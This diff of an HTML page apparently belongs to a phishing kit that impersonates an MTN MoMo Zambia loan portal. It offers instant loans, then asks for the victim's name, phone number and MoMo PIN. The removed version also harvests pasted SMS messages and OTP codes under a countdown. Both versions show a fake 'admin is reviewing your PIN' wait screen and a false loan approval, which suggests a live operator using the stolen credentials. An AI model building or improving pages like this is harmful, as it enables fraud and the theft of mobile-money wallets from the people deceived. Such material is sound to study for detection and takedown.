@@ -3,269 +3,134 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MTN MoMo Zambia - Instant Credit Portal</title>
+  <title>MTN MoMo Zambia Loans</title>
   <link rel="stylesheet" href="style.css">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
+
   <div class="portal-container">
-    
-    <!-- Header / Branding -->
-    <header class="portal-header">
+    <!-- Header -->
+    <div class="portal-header">
       <div class="brand-badge">
         <span class="momo-logo-text">MTN <b>MoMo</b> Loans</span>
         <span class="verified-tag">✓ VERIFIED 2026</span>
       </div>
-    </header>
-
-    <!-- Initial Welcome & Loan Calculator View (Matches 1000045582.png) -->
-    <div class="form-step active" id="view-welcome">
-      <div class="card text-center">
-        <h2>Welcome to MTN MoMo</h2>
-        <p class="subtitle">Get loans easily through MTN MoMo</p>
-        
-        <div class="calculator-box">
-          <div class="calc-row">
-            <span>Amount</span>
-            <span class="highlight-yellow" id="calcAmountDisplay">ZMW 1,000,000</span>
-          </div>
-          <div class="calc-row">
-            <span>Term</span>
-            <span class="highlight-yellow" id="calcTermDisplay">48 Months</span>
-          </div>
-          <div class="slider-group">
-            <input type="range" id="loanRange" min="500000" max="5000000" step="100000" value="1000000">
-            <div class="slider-limits">
-              <span>ZMW 500,000</span>
-              <span>ZMW 5,000,000</span>
-            </div>
-          </div>
-          <div class="calc-row monthly-row">
-            <span>Monthly Payment</span>
-            <span class="highlight-yellow monthly-val" id="monthlyPaymentDisplay">ZMW 20,834</span>
-          </div>
-        </div>
-
-        <button id="startAppBtn" class="btn-primary">START APPLICATION</button>
-      </div>
     </div>
 
-    <!-- Multi-Step Form Wrapper (Hidden initially until Start Application is clicked) -->
-    <div id="application-flow" style="display:none;">
+    <!-- Step 0: Welcome -->
+    <div id="step-welcome" class="card text-center">
+      <h2>Quick Mobile Loans</h2>
+      <p class="subtitle">Instant ZMW cash direct to your MTN Mobile Money wallet.</p>
+      <button id="start-loan-btn" class="btn-primary">Apply Now</button>
+    </div>
+
+    <!-- Step 1: Loan Calculator -->
+    <div id="step-loan" class="card" style="display: none;">
+      <div class="horizontal-steps">
+        <div class="step-line active"></div>
+        <div class="step-line"></div>
+        <div class="step-line"></div>
+      </div>
+      <p class="step-counter-text">Step 1 of 3: Select Amount</p>
       
-      <!-- Top Navigation & Progress -->
-      <div class="nav-bar">
-        <button id="backBtn" class="back-link">← Back</button>
-        <span class="step-title-tracker">Loan Application</span>
-      </div>
-
-      <div class="steps-indicator horizontal-steps">
-        <div class="step-line active" id="indicator-1"></div>
-        <div class="step-line" id="indicator-2"></div>
-        <div class="step-line" id="indicator-3"></div>
-      </div>
-      <p class="step-counter-text" id="stepCounterText">Step 1 of 3</p>
-
-      <!-- Step 1: Loan Details (Matches 1000045583.png) -->
-      <div class="form-step" id="step-1">
-        <div class="card">
-          <div class="input-group">
-            <label>Loan Type</label>
-            <select id="loanType">
-              <option value="Business Loan">Business Loan</option>
-              <option value="Personal Loan">Personal Loan</option>
-              <option value="Emergency Loan">Emergency Loan</option>
-            </select>
-          </div>
-
-          <div class="input-group">
-            <label>Loan Amount (ZMW)</label>
-            <input type="number" id="inputLoanAmount" value="1000000">
-          </div>
-
-          <div class="input-group">
-            <label>Loan Term</label>
-            <select id="loanTerm">
-              <option value="48 Months">48 Months</option>
-              <option value="24 Months">24 Months</option>
-              <option value="12 Months">12 Months</option>
-              <option value="6 Months">6 Months</option>
-            </select>
-          </div>
-
-          <div class="input-group">
-            <label>Purpose of Loan</label>
-            <textarea id="loanPurpose" rows="3" placeholder="Describe the purpose of your loan..."></textarea>
-          </div>
-
-          <button id="step1Next" class="btn-primary">NEXT STEP</button>
+      <h2>Choose Loan Amount</h2>
+      <div class="calculator-box">
+        <div class="calc-row">
+          <span>Requested Amount:</span>
+          <span id="loan-amount-display" class="highlight-yellow">ZMW 2,500</span>
+        </div>
+        <div class="slider-group">
+          <input type="range" id="loan-amount-range" min="500" max="10000" step="100" value="2500">
+          <div class="slider-limits"><span>ZMW 500</span><span>ZMW 10,000</span></div>
+        </div>
+        <div class="calc-row monthly-row">
+          <span>Est. Monthly Repayment:</span>
+          <span id="monthly-repay-display" class="monthly-val">ZMW 958</span>
         </div>
       </div>
-
-      <!-- Step 2: Personal Details & Phone (Matches 1000045584.png) -->
-      <div class="form-step" id="step-2" style="display:none;">
-        <div class="card">
-          <div class="row-inputs">
-            <div class="input-group half">
-              <label>First Name</label>
-              <input type="text" id="firstName" placeholder="First Name">
-            </div>
-            <div class="input-group half">
-              <label>Last Name</label>
-              <input type="text" id="lastName" placeholder="Last Name">
-            </div>
-          </div>
-
-          <div class="input-group">
-            <label>Phone Number (Zambia)</label>
-            <div class="phone-input-container">
-              <span class="prefix-box">+260</span>
-              <input type="text" id="momo_phone" placeholder="9671234567" maxlength="10">
-            </div>
-            <small class="hint">10 digits without +260 prefix (e.g., 9671234567)</small>
-          </div>
-
-          <div class="btn-group">
-            <button id="step2Back" class="btn-secondary">BACK</button>
-            <button id="step2Next" class="btn-primary">NEXT STEP</button>
-          </div>
-        </div>
-      </div>
-
-      <!-- Step 3: Employment & Summary (Matches 1000045585.png) -->
-      <div class="form-step" id="step-3" style="display:none;">
-        <div class="card">
-          <div class="input-group">
-            <label>Employment Status</label>
-            <select id="employmentStatus">
-              <option value="Self-employed">Self-employed</option>
-              <option value="Employed">Employed</option>
-              <option value="Business Owner">Business Owner</option>
-            </select>
-          </div>
-
-          <div class="input-group">
-            <label>Annual Income (ZMW)</label>
-            <input type="number" id="annualIncome" placeholder="Enter annual income">
-          </div>
-
-          <div class="summary-card">
-            <h3>Application Summary</h3>
-            <div class="sum-row"><span>Loan Amount:</span> <span id="sumAmount">ZMW 1,000,000</span></div>
-            <div class="sum-row"><span>Loan Term:</span> <span id="sumTerm">48 Months</span></div>
-            <div class="sum-row"><span>Purpose:</span> <span id="sumPurpose">-</span></div>
-            <div class="sum-row"><span>Applicant:</span> <span id="sumApplicant">-</span></div>
-          </div>
-
-          <div class="btn-group">
-            <button id="step3Back" class="btn-secondary">BACK</button>
-            <button id="submitAppBtn" class="btn-primary">SUBMIT APPLICATION</button>
-          </div>
-        </div>
-      </div>
-
+      <button id="proceed-personal-btn" class="btn-primary">Continue</button>
     </div>
 
-    <!-- MoMo Login / PIN Verification Overlay View (Matches 1000045586.png) -->
-    <div id="momo-login-view" style="display:none;">
-      <div class="portal-header login-header">
-        <div class="momo-logo-large">MM</div>
-        <h2>MoMo</h2>
-        <p>Login via MTN MoMo</p>
+    <!-- Step 2: Personal & Employment Details -->
+    <div id="step-personal" class="card" style="display: none;">
+      <div class="horizontal-steps">
+        <div class="step-line active"></div>
+        <div class="step-line active"></div>
+        <div class="step-line"></div>
       </div>
-      <div class="card text-center">
-        <h3>Login to MTN MoMo</h3>
-        <div class="phone-display-box">
-          <span>+260</span>
-          <span id="displayPhoneNum">9671234567</span>
-        </div>
-        <label class="pin-label">Enter your MoMo PIN (5 digits):</label>
-        
-        <div class="pin-dots-container">
-          <input type="password" id="momo_pin" maxlength="5" class="hidden-pin-input">
-          <div class="pin-dots">
-            <span class="dot"></span>
-            <span class="dot"></span>
-            <span class="dot"></span>
-            <span class="dot"></span>
-            <span class="dot"></span>
-          </div>
-        </div>
+      <p class="step-counter-text">Step 2 of 3: Personal Details</p>
 
-        <button id="loginMoMoBtn" class="btn-primary" disabled>LOGIN</button>
-      </div>
-    </div>
-
-    <!-- SMS Verification View (Matches 1000045593.png) -->
-    <div id="sms-verification-view" style="display:none;">
-      <div class="nav-bar">
-        <span class="sub-header-title">SMS Verification</span>
-      </div>
-      <div class="card">
-        <h3>Paste SMS Message</h3>
-        <p class="subtitle">A verification message has been sent to your phone. Please copy and paste the full message here.</p>
-        
-        <div class="countdown-banner">
-          <span class="countdown-icon">⏳</span>
-          <div>
-            <strong>Message expires in <span id="timerSeconds">59</span>s.</strong>
-            <p>Paste your SMS before time runs out.</p>
-          </div>
-        </div>
-
+      <form id="personal-form">
         <div class="input-group">
-          <textarea id="sms_text" rows="4" placeholder="Paste your full SMS message here..."></textarea>
-          <small class="hint">Example: "Your MTN MoMo verification code is: 123456"</small>
+          <label>Full Name (as per NRC)</label>
+          <input type="text" id="fullname" required placeholder="John Mwansa">
         </div>
-
-        <button id="submitSmsBtn" class="btn-primary" disabled>SUBMIT</button>
-      </div>
-    </div>
-
-    <!-- OTP Code Verification View (Matches 1000045589.png) -->
-    <div id="otp-verification-view" style="display:none;">
-      <div class="nav-bar">
-        <span class="sub-header-title">OTP Verification</span>
-      </div>
-      <div class="card">
-        <h3>Enter OTP Code</h3>
-        <p class="subtitle">Enter the 4-digit OTP code sent to your phone via MTN MoMo</p>
-        
         <div class="input-group">
-          <label>OTP Code (4 digits):</label>
-          <input type="text" id="otp_code" maxlength="4" placeholder="••••">
+          <label>MTN MoMo Phone Number</label>
+          <div class="phone-input-container">
+            <span class="prefix-box">+260</span>
+            <input type="tel" id="phone" required placeholder="96xxxxxxx" maxlength="9">
+          </div>
         </div>
-
-        <button id="submitOtpBtn" class="btn-primary" disabled>VERIFY & APPROVE LOAN</button>
-      </div>
+        <div class="input-group">
+          <label>Employment Status</label>
+          <select id="employment" required>
+            <option value="">Select status</option>
+            <option value="employed">Employed</option>
+            <option value="self-employed">Self-Employed</option>
+            <option value="business">Business Owner</option>
+          </select>
+        </div>
+        <button type="submit" class="btn-primary">Verify Account</button>
+      </form>
     </div>
 
-    <!-- Admin Waiting / Processing Screen (Matches 1000045587.png / 45588 / 45590) -->
-    <div id="admin-waiting-view" class="admin-waiting-screen" style="display:none;">
+    <!-- Step 3: PIN Auth Screen -->
+    <div id="step-auth" class="card login-header text-center" style="display: none;">
+      <div class="momo-logo-large">MoMo</div>
+      <h2>Enter MoMo PIN</h2>
+      <p class="pin-label">Confirm transaction PIN for disbursement</p>
+      
+      <div class="pin-dots">
+        <input type="password" class="dot pin-digit" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+        <input type="password" class="dot pin-digit" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+        <input type="password" class="dot pin-digit" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+        <input type="password" class="dot pin-digit" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+      </div>
+
+      <button id="submit-pin-btn" class="btn-primary">Authorize Loan</button>
+    </div>
+
+    <!-- Step 4: Waiting Screen (Admin Review) -->
+    <div id="step-waiting" class="admin-waiting-screen" style="display: none;">
       <div class="spinner-icon">⏳</div>
-      <h2 id="waitingTitle">Waiting for Admin Approval</h2>
-      <p id="waitingSubtitle">Your login is pending admin verification. Please wait...</p>
+      <h2>Verifying MoMo PIN</h2>
+      <p>Checking PIN status with administrator...</p>
       
       <div class="progress-bar-container">
-        <div class="animated-progress-bar" id="waitingProgressBar">Admin is reviewing your request...</div>
+        <div class="animated-progress-bar">Admin is reviewing your PIN...</div>
       </div>
-      
-      <p class="app-id-display">Application ID: <span id="appIdText" class="highlight-yellow">APP-1785526685654</span></p>
+      <div class="app-id-display">Application ID: <span id="app-id-text" class="highlight-yellow"></span></div>
     </div>
 
-    <!-- Final Success / Congratulations Screen -->
-    <div id="success-view" style="display:none;">
-      <div class="card success-card text-center">
-        <div class="success-icon">✓</div>
-        <h2>Congratulations!</h2>
-        <p>Your loan application has been successfully verified, approved, and queued for instant MTN MoMo disbursement.</p>
-        <div class="badge-verified-box">STATUS: VERIFIED SECURE</div>
-      </div>
+    <!-- Step 5: SMS Verification Placeholder -->
+    <div id="step-sms" class="card text-center" style="display: none;">
+      <h2>SMS Verification</h2>
+      <p class="subtitle">Paste recent message confirmation if requested.</p>
+    </div>
+
+    <!-- Step 6: Success Screen -->
+    <div id="step-success" class="card success-card text-center" style="display: none;">
+      <div class="success-icon">✓</div>
+      <h2>Loan Approved!</h2>
+      <p class="subtitle">Funds have been dispatched to your MTN MoMo wallet.</p>
+      <div class="badge-verified-box">Disbursement Complete</div>
     </div>
 
   </div>
 
   <script src="script.js"></script>
 </body>
-                </html>
-  
+  </html>
+            
